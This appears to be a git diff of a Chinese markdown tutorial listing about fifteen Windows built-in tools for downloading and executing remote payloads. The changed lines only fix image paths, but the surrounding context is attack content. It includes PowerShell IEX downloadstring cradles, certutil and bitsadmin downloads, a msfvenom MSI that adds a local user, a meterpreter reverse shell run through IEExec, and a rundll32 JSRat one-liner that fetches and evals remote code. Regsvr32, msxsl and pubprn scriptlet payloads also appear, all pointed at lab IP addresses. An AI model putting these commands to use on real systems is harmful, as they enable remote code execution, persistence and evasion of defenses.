@@ -37,7 +37,7 @@ powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128
 ```
 powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))"
 ```
-![20200413-1.png](../../_img\05-应急响应/1656916351926-4bf36904-92e8-4e4d-8264-315a1fcd3fe2.png)
+![20200413-1.png](_img\05-应急响应/1656916351926-4bf36904-92e8-4e4d-8264-315a1fcd3fe2.png)
 
 
 # 2、Bitsadmin
@@ -46,7 +46,7 @@ bitsadmin是一个命令行工具，可用于创建下载或上传工作和监�
 bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
 ```
 
-输入以上命令，成功下载文件。<br />![20200413-2.png](../../_img\05-应急响应/1656916361122-fd389a14-8de0-4703-b9aa-95966754c883.png)
+输入以上命令，成功下载文件。<br />![20200413-2.png](_img\05-应急响应/1656916361122-fd389a14-8de0-4703-b9aa-95966754c883.png)
 
 
 # 3、certutil
@@ -59,7 +59,7 @@ certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
 #删除缓存
 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
 ```
-![20200413-3.png](../../_img\05-应急响应/1656916368843-0fdb76df-de28-423d-88e7-657784c6f5df.png)
+![20200413-3.png](_img\05-应急响应/1656916368843-0fdb76df-de28-423d-88e7-657784c6f5df.png)
 
 
 # 4、wget
@@ -71,7 +71,7 @@ wget.exe下载：[https://eternallybored.org/misc/wget/](https://eternallybored.
 ```
 wget -O "evil.txt" http://192.168.28.128/imag/evil.txt
 ```
-![20200413-4.png](../../_img\05-应急响应/1656916412390-2f27a41d-c207-4790-b0c9-9f71c05644dc.png)
+![20200413-4.png](_img\05-应急响应/1656916412390-2f27a41d-c207-4790-b0c9-9f71c05644dc.png)
 
 
 # 5、ipc$文件共享
@@ -83,7 +83,7 @@ net use \\192.168.28.128\ipc$ /user:administrator "abc123!"
 #复制远程文件到本地主机
 copy \\192.168.28.128\c$\2.txt D:\test
 ```
-![20200413-5.png](../../_img\05-应急响应/1656916418126-56118024-889a-46ac-b6aa-f4eebdc9c666.png)
+![20200413-5.png](_img\05-应急响应/1656916418126-56118024-889a-46ac-b6aa-f4eebdc9c666.png)
 
 
 # 6、FTP 
@@ -96,7 +96,7 @@ password
 get file
 exit
 ```
-![20200413-6.png](../../_img\05-应急响应/1656916424034-f5b42e91-e2d0-4899-98bd-ee982b759dde.png)
+![20200413-6.png](_img\05-应急响应/1656916424034-f5b42e91-e2d0-4899-98bd-ee982b759dde.png)
 
 
 # 7、TFTP
@@ -108,7 +108,7 @@ tftp32服务端下载地址：[http://tftpd32.jounin.net/tftpd32_download.html](
 ```
 tftp -i 你的IP get 要下载文件 存放位置
 ```
-![20200413-7.jpg](../../_img\05-应急响应/1656916430791-cee6b49e-b72a-4ea2-8adc-3ae45101454a.jpeg)
+![20200413-7.jpg](_img\05-应急响应/1656916430791-cee6b49e-b72a-4ea2-8adc-3ae45101454a.jpeg)
 
 
 # 8、WinScp
@@ -122,7 +122,7 @@ winscp.exe /console /command "option batch continue" "option confirm off" "open 
 winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "get /tmp D:\test\app\" "exit" /log=log_file.tx
 ```
 
-使用winscp.exe 作为命令行参数执行远程上传/下载操作。<br />![20200413-8.png](../../_img\05-应急响应/1656916434643-f363d275-c4dd-4275-b1de-6b587ffcfb2f.png)
+使用winscp.exe 作为命令行参数执行远程上传/下载操作。<br />![20200413-8.png](_img\05-应急响应/1656916434643-f363d275-c4dd-4275-b1de-6b587ffcfb2f.png)
 
 
 # 9、msiexec
@@ -134,7 +134,7 @@ msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi
 msiexec /q /i http://192.168.28.128/evil.msi
 ```
 
-成功添加了一个test用户：<br />![20200413-9.png](../../_img\05-应急响应/1656916441957-b5603633-e174-4c21-889c-67c776a906b6.png)
+成功添加了一个test用户：<br />![20200413-9.png](_img\05-应急响应/1656916441957-b5603633-e174-4c21-889c-67c776a906b6.png)
 
 
 # 10、IEExec
@@ -152,7 +152,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f e
 C:\Windows\Microsoft.NET\Framework64\v2.0.50727>caspol.exe -s off
 C:\Windows\Microsoft.NET\Framework64\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe
 ```
-![20200413-10.png](../../_img\05-应急响应/1656916447442-60a3dd43-a197-4ba8-af53-41640ac98da7.png)
+![20200413-10.png](_img\05-应急响应/1656916447442-60a3dd43-a197-4ba8-af53-41640ac98da7.png)
 
 
 # 11、mshta
@@ -182,7 +182,7 @@ demo
 </HEAD> 
 </HTML>
 ```
-![20200413-11.png](../../_img\05-应急响应/1656916453280-35c47293-1098-430c-a22f-e485ea53175e.png)
+![20200413-11.png](_img\05-应急响应/1656916453280-35c47293-1098-430c-a22f-e485ea53175e.png)
 
 
 # 12、rundll32
@@ -191,7 +191,7 @@ demo
 
 项目地址：[https://github.com/Hood3dRob1n/JSRat-Py.git](https://github.com/Hood3dRob1n/JSRat-Py.git)
 
-步骤一：开始运行JSRat，监听本地8888端口。<br />![20200413-12-1.png](../../_img\05-应急响应/1656916457916-c5ce1c37-ef2d-49b4-9aed-1c02b35c443e.png)
+步骤一：开始运行JSRat，监听本地8888端口。<br />![20200413-12-1.png](_img\05-应急响应/1656916457916-c5ce1c37-ef2d-49b4-9aed-1c02b35c443e.png)
 
 步骤二：通过url访问，可以查看恶意代码。
 
@@ -200,7 +200,7 @@ demo
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.28.131:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
 ```
 
-步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：<br />![20200413-12-3.png](../../_img\05-应急响应/1656916510114-c1a695a9-042e-4608-ab5e-518000d4baa2.png)
+步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：<br />![20200413-12-3.png](_img\05-应急响应/1656916510114-c1a695a9-042e-4608-ab5e-518000d4baa2.png)
 
 
 # 13、regsvr32 
@@ -230,7 +230,7 @@ regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
 </scriptlet>
 ```
 
-执行命令，成功弹计算器：<br />![20200413-13.png](../../_img\05-应急响应/1656916503754-ca606097-3fb9-4568-999d-7fe6dff85899.png)
+执行命令，成功弹计算器：<br />![20200413-13.png](_img\05-应急响应/1656916503754-ca606097-3fb9-4568-999d-7fe6dff85899.png)
 
 
 # 14、MSXSL.EXE
@@ -278,7 +278,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
 </xsl:template>
 </xsl:stylesheet>
 ```
-![20200413-14.png](../../_img\05-应急响应/1656916495090-e1e592f0-c95c-4190-a0a0-3835aaef0275.png)
+![20200413-14.png](_img\05-应急响应/1656916495090-e1e592f0-c95c-4190-a0a0-3835aaef0275.png)
 
 
 # 15、pubprn.vbs
@@ -309,4 +309,4 @@ test.sct
 </script>
 </scriptlet>
 ```
-![20200413-15.png](../../_img\05-应急响应/1656916487508-612d3ed8-d04a-4a4a-82f2-14db36a67723.png)
+![20200413-15.png](_img\05-应急响应/1656916487508-612d3ed8-d04a-4a4a-82f2-14db36a67723.png)
